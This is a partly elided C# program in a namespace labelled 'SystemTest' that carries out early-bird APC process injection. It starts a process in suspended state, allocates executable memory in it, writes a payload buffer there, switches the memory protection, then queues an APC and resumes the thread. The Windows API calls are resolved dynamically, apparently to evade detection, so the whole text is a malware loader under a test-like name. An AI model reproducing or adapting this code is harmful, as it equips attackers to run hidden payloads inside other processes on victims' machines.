...
namespace SystemTest
{
    public class Program
    {
        static void Main(string[] args)
        {
            ...
            IntPtr pointer = TestUtils.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            ...
            bool result = CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (result == false) {
                goto Fail;
            }

            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            ...
            IntPtr alloc = virtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);
            if (alloc == IntPtr.Zero) {
                goto Fail;
            }

            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            ...
            result = writeProcessMemory(pi.hProcess, alloc, buf, (uint)buf.Length, out UIntPtr bytesWritten);
            if (result == false) {
                goto Fail;
            }

            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "OpenThread");
            ...
            if (tpointer == IntPtr.Zero) {
                goto Fail;
            }

            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            ...
            uint oldProtect = 0;
            virtualProtectEx(pi.hProcess, alloc, buf.Length, 0x20, out oldProtect);

            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            ...
            pointer = TestUtils.GetLibraryAddress("kernel32.dll", "ResumeThread");
